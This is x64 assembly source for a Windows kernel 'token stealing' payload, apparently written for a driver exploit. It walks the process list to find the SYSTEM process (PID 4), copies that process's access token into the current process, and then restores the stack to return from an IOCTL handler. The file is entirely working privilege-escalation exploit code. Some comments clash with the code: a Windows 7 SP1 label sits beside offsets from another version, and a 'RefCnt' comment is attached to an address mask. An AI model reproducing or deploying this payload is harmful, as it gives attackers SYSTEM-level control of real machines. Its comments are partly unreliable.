
.code
PUBLIC StealToken
StealToken PROC

; Start of Token Stealing Stub
xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 0B8h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2e8h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2e8h
cmp[rax + 2e0h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 358h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 358h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

xor rax, rax

; restore rbx, rsi, rdi
; mov rbx, 3h
; mov rsi, 00000000c00000bbh
; mov rdi, 4dh

xor r12, r12
; xor r14, r14                 ; R14 will be restored in IrpDeviceIoCtlHandler
; xor r15, r15

xor rdi, rdi

add rsp, 10h
ret

StealToken ENDP
end
